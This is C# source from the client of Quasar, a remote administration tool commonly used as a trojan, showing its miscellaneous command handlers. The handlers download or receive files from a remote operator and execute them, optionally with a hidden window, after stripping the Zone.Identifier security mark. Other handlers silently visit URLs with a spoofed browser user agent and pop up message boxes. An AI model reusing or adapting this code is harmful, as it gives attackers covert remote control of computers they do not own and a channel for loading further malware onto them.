﻿using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN MISCELLANEOUS METHODS. */
    public static partial class CommandHandler
    {
        public static void HandleDoDownloadAndExecute(DoDownloadAndExecute command,
            Client client)
        {
            client.Send(new SetStatus {Message = "Downloading file..."});

            new Thread(() =>
            {
                string tempFile = FileHelper.GetTempFilePath(".exe");

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.Url, tempFile);
                    }
                }
                catch
                {
                    client.Send(new SetStatus { Message = "Download failed" });
                    return;
                }

                client.Send(new SetStatus { Message = "Downloaded File" });

                try
                {
                    FileHelper.DeleteZoneIdentifier(tempFile);

                    var bytes = File.ReadAllBytes(tempFile);
                    if (!FileHelper.IsValidExecuteableFile(bytes))
                        throw new Exception("no pe file");

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = tempFile;
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    NativeMethods.DeleteFile(tempFile);
                    client.Send(new SetStatus {Message = $"Execution failed: {ex.Message}"});
                    return;
                }
                
                client.Send(new SetStatus {Message = "Executed File"});
            }).Start();
        }

        public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Client client)
        {
            if (!_renamedFiles.ContainsKey(command.Id))
                _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));

            string filePath = _renamedFiles[command.Id];

            try
            {
                if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.IsValidExecuteableFile(command.Block))
                    throw new Exception("No executable file");

                FileSplit destFile = new FileSplit(filePath);

                if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                    throw new Exception(destFile.LastError);

                if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                {
                    if (_renamedFiles.ContainsKey(command.Id))
                        _renamedFiles.Remove(command.Id);

                    FileHelper.DeleteZoneIdentifier(filePath);

                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    if (command.RunHidden)
                    {
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.CreateNoWindow = true;
                    }
                    startInfo.UseShellExecute = false;
                    startInfo.FileName = filePath;
                    Process.Start(startInfo);

                    client.Send(new SetStatus {Message = "Executed File"});
                }
            }
            catch (Exception ex)
            {
                if (_renamedFiles.ContainsKey(command.Id))
                    _renamedFiles.Remove(command.Id);
                NativeMethods.DeleteFile(filePath);

                client.Send(new SetStatus {Message = $"Execution failed: {ex.Message}"});
            }
        }

        public static void HandleDoVisitWebsite(DoVisitWebsite command, Client client)
        {
            string url = command.Url;

            if (!url.StartsWith("http"))
                url = "http://" + url;

            if (Uri.IsWellFormedUriString(url, UriKind.RelativeOrAbsolute))
            {
                if (!command.Hidden)
                    Process.Start(url);
                else
                {
                    try
                    {
                        HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(url);
                        request.UserAgent =
                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
                        request.AllowAutoRedirect = true;
                        request.Timeout = 10000;
                        request.Method = "GET";

                        using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                        {
                        }
                    }
                    catch
                    {
                    }
                }

                client.Send(new SetStatus {Message = "Visited Website"});
            }
        }

        public static void HandleDoShowMessageBox(DoShowMessageBox command, Client client)
        {
            new Thread(() =>
            {
                MessageBox.Show(command.Text, command.Caption,
                    (MessageBoxButtons) Enum.Parse(typeof(MessageBoxButtons), command.Button),
                    (MessageBoxIcon) Enum.Parse(typeof(MessageBoxIcon), command.Icon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            }).Start();

            client.Send(new SetStatus {Message = "Showed Messagebox"});
        }
    }
}